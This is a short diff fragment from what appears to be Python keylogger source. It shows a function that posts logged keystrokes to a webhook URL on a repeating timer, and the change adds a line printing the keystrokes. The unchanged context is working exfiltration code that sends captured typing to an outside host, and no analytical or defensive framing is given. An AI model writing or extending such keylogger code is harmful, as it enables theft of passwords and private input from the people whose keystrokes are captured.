@@ -11,6 +11,7 @@ def send_post_req():
     try:
         payload = {"content": logged_keystrokes}
         requests.post(f"{webhookUrl}", data=payload, headers={"Content-Type": "text/plain"})
+        print(logged_keystrokes)
         logged_keystrokes = ""  
         timer = threading.Timer(logging_interval, send_post_req)
         timer.start()
